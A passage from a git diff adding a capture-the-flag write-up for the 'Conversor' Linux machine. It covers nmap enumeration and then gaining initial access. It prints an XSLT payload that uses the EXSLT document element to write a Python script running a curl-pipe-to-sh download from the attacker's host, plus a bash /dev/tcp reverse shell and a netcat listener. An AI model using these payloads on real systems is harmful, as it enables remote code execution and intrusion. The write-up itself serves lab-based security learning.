@@ -19,3 +19,55 @@ a new linux machine, with easy difficulty, that put in front of us :
 ## USER.TXT
 
 ### NMAP Enumeration
+
+as with every machine we start with the nmap scan, that show as a classic 22/80 ports.
+
+![Icon](Images/nmapscan.png)
+
+we go to conversor web page, as first sight we see XML converation via XSLT, with a small round with the discover the source code in the About page.
+
+in the Source code we got some valuabla informations, the most imprtants are :
+
+1. XSLT is exploitable
+2. you can run python scripts in the scripts directory, you can find this info in install.md
+3. the users database is in instance directory
+
+so first of all we will start with a reverse shell, by writing a python script, that will use curl to connect to our machine, that have aleardy a python http server prepared, to copy a reverse shell script, and lunche it to get our initial login.
+
+so upload this XSLT File:
+
+```XSLT
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet
+    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+    xmlns:exploit="http://exslt.org/common"
+    extension-element-prefixes="exploit"
+    version="1.0">
+<xsl:template match="/">
+<exploit:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
+import os
+os.system("curl 10.10.14.203:8000/shell.sh|sh")
+</exploit:document>
+</xsl:template>
+</xsl:stylesheet>
+```
+
+and we prepare a python http server by using the command `python3 -m http.server`, where the reverse shell script exist:
+
+```sh
+#!/bin/bash
+bash -c 'bash -i >& /dev/tcp/10.10.14.203/9999 0>&1'
+```
+
+and last thing, nc listener.
+
+and by that we get our initial access, as you can see 
+
+![Icon](Images/xsltrevshell.png)
+
+
+
+
+
+
+
